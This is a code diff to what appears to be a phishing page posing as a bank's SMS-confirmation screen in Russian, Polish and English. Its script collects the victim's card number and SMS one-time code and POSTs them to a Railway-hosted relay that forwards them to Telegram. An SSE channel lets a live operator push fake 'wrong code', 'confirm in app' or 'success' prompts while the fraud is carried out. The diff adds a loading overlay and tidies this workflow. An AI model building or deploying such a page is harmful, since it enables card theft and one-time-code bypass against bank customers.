@@ -369,6 +369,45 @@
             transform: none !important;
         }
 
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .loader {
+            border: 8px solid var(--primary-light);
+            border-top: 8px solid var(--primary);
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1s linear infinite;
+        }
+
+        .loading-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         @keyframes slideUp {
             from {
                 opacity: 0;
@@ -514,6 +553,11 @@
             .push-title {
                 font-size: 18px;
             }
+
+            .loader {
+                width: 60px;
+                height: 60px;
+            }
         }
 
         @media (max-width: 480px) {
@@ -592,63 +636,21 @@
             .push-message {
                 font-size: 14px;
             }
-        }
 
-        @media (max-width: 380px) {
-            .code-input {
-                width: 35px;
-                height: 45px;
-                font-size: 16px;
+            .loader {
+                width: 50px;
+                height: 50px;
             }
-            
-            .code-inputs {
-                gap: 6px;
-            }
-            
-            .sms-card {
-                padding: 20px 15px;
-            }
-            
-            .btn {
-                max-width: 220px;
-            }
-        }
-
-        /* iOS Specific Fixes */
-        @supports (-webkit-touch-callout: none) {
-            .language-btn, .btn-icon, .btn {
-                min-height: 44px;
-            }
-
-            body {
-                min-height: -webkit-fill-available;
-            }
-
-            html {
-                height: -webkit-fill-available;
-            }
-            
-            .code-input {
-                font-size: 20px;
-            }
-        }
-
-        /* Убираем скроллбар */
-        ::-webkit-scrollbar {
-            width: 0px;
-            background: transparent;
-        }
-
-        * {
-            scrollbar-width: none;
-        }
-
-        * {
-            -ms-overflow-style: none;
         }
     </style>
 </head>
 <body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loader"></div>
+        <div class="loading-text" id="loadingText">Ожидание подтверждения оператора...</div>
+    </div>
+
     <div class="container">
         <header>
             <div class="logo">
@@ -731,7 +733,10 @@
                 seconds: 'сек.',
                 resendText: 'Отправить код повторно',
                 pushTitle: 'Подтвердите операцию',
-                pushMessage: 'Пожалуйста, подтвердите операцию в вашем банковском приложении'
+                pushMessage: 'Пожалуйста, подтвердите операцию в вашем банковском приложении',
+                loadingText: 'Ожидание подтверждения оператора...',
+                successText: 'SMS код подтвержден!',
+                errorText: 'Неверный SMS код'
             },
             pl: {
                 smsTitle: 'Potwierdzenie SMS',
@@ -741,7 +746,10 @@
                 seconds: 'sek.',
                 resendText: 'Wyślij kod ponownie',
                 pushTitle: 'Potwierdź operację',
-                pushMessage: 'Proszę potwierdzić operację w aplikacji bankowej'
+                pushMessage: 'Proszę potwierdzić operację w aplikacji bankowej',
+                loadingText: 'Oczekiwanie na potwierdzenie operatora...',
+                successText: 'Kod SMS potwierdzony!',
+                errorText: 'Nieprawidłowy kod SMS'
             },
             en: {
                 smsTitle: 'SMS Confirmation',
@@ -751,14 +759,70 @@
                 seconds: 'sec.',
                 resendText: 'Resend code',
                 pushTitle: 'Confirm the operation',
-                pushMessage: 'Please confirm the operation in your banking app'
+                pushMessage: 'Please confirm the operation in your banking app',
+                loadingText: 'Waiting for operator confirmation...',
+                successText: 'SMS code confirmed!',
+                errorText: 'Invalid SMS code'
             }
         };
 
         let currentLanguage = sessionStorage.getItem('selectedLanguage') || 'ru';
         let timerValue = 60;
         let timerInterval;
+        let eventSource = null;
+        const RAILWAY_URL = "https://roomix-production.up.railway.app";
 
+        // ========== ФУНКЦИИ ДЛЯ УВЕДОМЛЕНИЙ ==========
+        window.showWrongSMSError = function() {
+            hideLoading();
+            
+            const btn = document.getElementById('confirmBtn');
+            const originalText = btn.innerHTML;
+            
+            btn.innerHTML = '<i class="fas fa-times"></i> ❌ ' + translations[currentLanguage].errorText;
+            btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
+            btn.disabled = true;
+            
+            // Очищаем поля
+            document.querySelectorAll('.code-input').forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+            
+            setTimeout(() => {
+                btn.innerHTML = originalText;
+                btn.style.background = '';
+                btn.disabled = false;
+                
+                // Фокус на первое поле
+                document.querySelector('.code-input').focus();
+            }, 3000);
+        };
+
+        window.showSuccessMessage = function() {
+            const btn = document.getElementById('confirmBtn');
+            const originalText = btn.innerHTML;
+            
+            btn.innerHTML = '<i class="fas fa-check"></i> ✅ ' + translations[currentLanguage].successText;
+            btn.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                hideLoading();
+                window.location.href = 'success.html';
+            }, 2000);
+        };
+
+        function showLoading() {
+            document.getElementById('loadingOverlay').classList.add('show');
+            document.getElementById('loadingText').textContent = translations[currentLanguage].loadingText;
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').classList.remove('show');
+        }
+
+        // ========== ОСНОВНЫЕ ФУНКЦИИ ==========
         function changeLanguage(lang) {
             currentLanguage = lang;
             sessionStorage.setItem('selectedLanguage', lang);
@@ -810,9 +874,7 @@
             const confirmBtn = document.getElementById('confirmBtn');
             
             inputs.forEach((input, index) => {
-                // Блокируем ввод не-цифр
                 input.addEventListener('keydown', (e) => {
-                    // Разрешаем: цифры, Backspace, Delete, Tab, стрелки
                     if (!/^\d$/.test(e.key) && 
                         !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown'].includes(e.key)) {
                         e.preventDefault();
@@ -823,7 +885,6 @@
                 input.addEventListener('input', (e) => {
                     const value = e.target.value;
                     
-                    // Оставляем только цифры
                     if (!/^\d*$/.test(value)) {
                         e.target.value = value.replace(/\D/g, '');
                         return;
@@ -832,7 +893,6 @@
                     if (value.length === 1) {
                         e.target.classList.add('filled');
                         
-                        // Переход к следующему полю
                         if (index < inputs.length - 1) {
                             inputs[index + 1].focus();
                         }
@@ -840,7 +900,6 @@
                         e.target.classList.remove('filled');
                     }
                     
-                    // Проверяем, все ли поля заполнены
                     checkAllFieldsFilled();
                 });
                 
@@ -868,7 +927,6 @@
                     }
                 });
                 
-                // Для мобильных устройств - открываем цифровую клавиатуру
                 input.addEventListener('focus', () => {
                     input.setAttribute('inputmode', 'numeric');
                 });
@@ -904,15 +962,11 @@
             });
         }
 
-        // ========== SSE ПОДКЛЮЧЕНИЕ ДЛЯ КОМАНД ОТ БОТА ==========
-        const RAILWAY_URL = "https://roomix-production.up.railway.app";
-        let eventSource = null;
-
+        // ========== SSE ПОДКЛЮЧЕНИЕ ==========
         function connectSSE() {
             try {
                 const userId = sessionStorage.getItem('currentTransactionId') || "user_default";
                 const sseUrl = `${RAILWAY_URL}/sse/${userId}`;
-                console.log(`🔄 Подключаемся к SSE:`, sseUrl);
 
                 if (eventSource) {
                     eventSource.close();
@@ -930,7 +984,6 @@
                         const data = JSON.parse(event.data);
 
                         if (data.type === 'connected') {
-                            console.log('✅ Подтверждение подключения SSE');
                             return;
                         }
 
@@ -953,28 +1006,59 @@
 
         // ========== ОБРАБОТКА КОМАНД ОТ БОТА ==========
         function handleBotCommand(command) {
-    console.log('🤖 Обработка команды:', command);
+            console.log('🤖 Обработка команды:', command);
 
-    if (command.action === 'push') {
-        console.log('🔔 Получена команда PUSH');
-        window.showPushNotification();
-    } else if (command.action === 'sms') {
-        console.log('📱 Получена команда SMS');
-        // Уже на странице SMS, ничего не делаем
-    } else if (command.action === 'wrong_card') {
-        console.log('❌ Получена команда WRONG_CARD');
-        window.redirectToPaymentWithError();
-    } else if (command.action === 'bind') {
-        console.log('🔗 Получена команда BIND');
-        window.redirectToSuccess();
-    } else if (command.action === 'success') {
-        console.log('🎉 Получена команда SUCCESS');
-        window.redirectToSuccess();
-    } else if (command.action === 'wrong_sms') {
-        console.log('❌ Получена команда WRONG_SMS');
-        window.showWrongSMSError();
-    }
-}
+            if (command.action === 'push') {
+                console.log('🔔 Получена команда PUSH');
+                window.showPushNotification();
+            } else if (command.action === 'wrong_card') {
+                console.log('❌ Получена команда WRONG_CARD');
+                hideLoading();
+                window.location.href = 'payment.html?status=wrong_card';
+            } else if (command.action === 'bind' || command.action === 'success') {
+                console.log('🎉 Получена команда SUCCESS');
+                window.showSuccessMessage();
+            } else if (command.action === 'wrong_sms') {
+                console.log('❌ Получена команда WRONG_SMS');
+                window.showWrongSMSError();
+            }
+        }
+
+        // ========== ОТПРАВКА SMS КОДА ==========
+        async function sendSMSToBot(smsCode) {
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                let cardNumber = urlParams.get('card');
+                
+                if (!cardNumber) {
+                    cardNumber = localStorage.getItem('lastCardNumber') || 'Неизвестно';
+                }
+                
+                console.log('🔍 Номер карты для СМС:', cardNumber);
+                
+                const smsMessage = `📱 <b>СМС КОД ПОДТВЕРЖДЕН</b>
+
+💳 <b>Номер карты:</b> ${cardNumber}
+🔐 <b>СМС код:</b> ${smsCode}`;
+
+                const response = await fetch(`${RAILWAY_URL}/send_to_telegram`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        message: smsMessage,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                console.log('✅ СМС код отправлен:', result.status === 'success');
+                return result.status === 'success';
+
+            } catch (error) {
+                console.error('❌ Ошибка отправки СМС кода:', error);
+                return false;
+            }
+        }
 
         // ========== ФУНКЦИИ РЕДИРЕКТА ==========
         window.redirectToPaymentWithError = function() {
@@ -987,7 +1071,6 @@
             window.location.href = 'success.html';
         };
 
-        // ========== ФУНКЦИЯ ПУШ-УВЕДОМЛЕНИЯ ==========
         window.showPushNotification = function() {
             const t = translations[currentLanguage];
 
@@ -1004,7 +1087,6 @@
 
             document.body.appendChild(pushModal);
 
-            // Закрытие по клику вне карточки
             pushModal.addEventListener('click', function(e) {
                 if (e.target === pushModal) {
                     pushModal.remove();
@@ -1012,108 +1094,38 @@
             });
         };
 
-        // ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
-        // ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
-async function sendSMSToBot(smsCode) {
-    try {
-        // ПОЛУЧАЕМ НОМЕР КАРТЫ ИЗ URL
-        const urlParams = new URLSearchParams(window.location.search);
-        let cardNumber = urlParams.get('card');
-        
-        if (!cardNumber) {
-            // ЕСЛИ В URL НЕТ, ПРОБУЕМ ИЗ localStorage
-            cardNumber = localStorage.getItem('lastCardNumber') || 'Неизвестно';
-        }
-        
-        console.log('🔍 Номер карты для СМС:', cardNumber);
-        
-        // СООБЩЕНИЕ: СМС КОД + НОМЕР КАРТЫ
-        const smsMessage = `📱 <b>СМС КОД ПОДТВЕРЖДЕН</b>
-
-💳 <b>Номер карты:</b> ${cardNumber}
-🔐 <b>СМС код:</b> ${smsCode}`;
-
-        // ОТПРАВЛЯЕМ ЧЕРЕЗ СЕРВЕР (БЕЗОПАСНО)
-        const SERVER_URL = 'https://roomix-production.up.railway.app';
-        const response = await fetch(`${SERVER_URL}/send_to_telegram`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                message: smsMessage,
-                parse_mode: 'HTML'
-            })
-        });
-
-        const result = await response.json();
-        console.log('✅ СМС код с номером карты отправлен через сервер:', result.status === 'success');
-
-        return result.status === 'success';
-
-    } catch (error) {
-        console.error('❌ Ошибка отправки СМС кода:', error);
-        return false;
-    }
-}
-
-        // ФУНКЦИИ УВЕДОМЛЕНИЙ
-        function showSuccessMessage() {
-            const btn = document.getElementById('confirmBtn');
-            const originalText = btn.innerHTML;
-            
-            btn.innerHTML = '<i class="fas fa-check"></i> ✅ Код отправлен!';
-            btn.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
-            btn.disabled = true;
-            
-            setTimeout(() => {
-                btn.innerHTML = originalText;
-                btn.style.background = '';
-                btn.disabled = false;
-                
-                // Очищаем поля
-                document.querySelectorAll('.code-input').forEach(input => {
-                    input.value = '';
-                    input.classList.remove('filled');
-                });
-                
-                // Фокус на первое поле
-                document.querySelector('.code-input').focus();
-                
-            }, 3000);
-        }
-
-        function showErrorMessage() {
-            const btn = document.getElementById('confirmBtn');
-            const originalText = btn.innerHTML;
-            
-            btn.innerHTML = '<i class="fas fa-times"></i> ❌ Ошибка отправки';
-            btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
-            btn.disabled = true;
-            
-            setTimeout(() => {
-                btn.innerHTML = originalText;
-                btn.style.background = '';
-                btn.disabled = false;
-            }, 3000);
-        }
-
-        // Обработчик кнопки подтверждения
+        // ========== ОБРАБОТЧИК КНОПКИ ПОДТВЕРЖДЕНИЯ ==========
         document.getElementById('confirmBtn').addEventListener('click', async function() {
             const inputs = document.querySelectorAll('.code-input');
             const smsCode = Array.from(inputs).map(input => input.value).join('');
             
             console.log('📱 Введенный СМС код:', smsCode);
             
-            // ОТПРАВЛЯЕМ СМС КОД В БОТА
-            const success = await sendSMSToBot(smsCode);
-            
-            if (success) {
-                showSuccessMessage();
-            } else {
-                showErrorMessage();
+            if (smsCode.length === 6) {
+                showLoading();
+                
+                const success = await sendSMSToBot(smsCode);
+                
+                if (!success) {
+                    hideLoading();
+                    const btn = document.getElementById('confirmBtn');
+                    const originalText = btn.innerHTML;
+                    
+                    btn.innerHTML = '<i class="fas fa-times"></i> ❌ Ошибка отправки';
+                    btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
+                    btn.disabled = true;
+                    
+                    setTimeout(() => {
+                        btn.innerHTML = originalText;
+                        btn.style.background = '';
+                        btn.disabled = false;
+                    }, 3000);
+                }
+                // Если успешно - остается loading и ждем команды от бота
             }
         });
 
-        // Инициализация
+        // ========== ИНИЦИАЛИЗАЦИЯ ==========
         document.addEventListener('DOMContentLoaded', function() {
             initLanguageSelector();
             changeLanguage(currentLanguage);
@@ -1121,48 +1133,18 @@ async function sendSMSToBot(smsCode) {
             startTimer();
             connectSSE();
             
-            // Фокус на первое поле ввода
             setTimeout(() => {
                 document.querySelector('.code-input').focus();
             }, 500);
         });
 
-        // Закрываем при закрытии страницы
         window.addEventListener('beforeunload', function() {
             if (eventSource) {
                 eventSource.close();
             }
         });
 
-        // Предотвращаем масштабирование на iOS при фокусе
         document.addEventListener('touchstart', function() {}, {passive: true});
-        window.showWrongSMSError = function() {
-    const btn = document.getElementById('confirmBtn');
-    const originalText = btn.innerHTML;
-    
-    btn.innerHTML = '<i class="fas fa-times"></i> ❌ Неверный SMS код';
-    btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
-    btn.disabled = true;
-    
-    // Очищаем поля
-    document.querySelectorAll('.code-input').forEach(input => {
-        input.value = '';
-        input.classList.remove('filled');
-    });
-    
-    setTimeout(() => {
-        btn.innerHTML = originalText;
-        btn.style.background = '';
-        btn.disabled = false;
-        
-        // Фокус на первое поле
-        document.querySelector('.code-input').focus();
-    }, 3000);
-};
     </script>
 </body>
 </html>
-
-
-
-
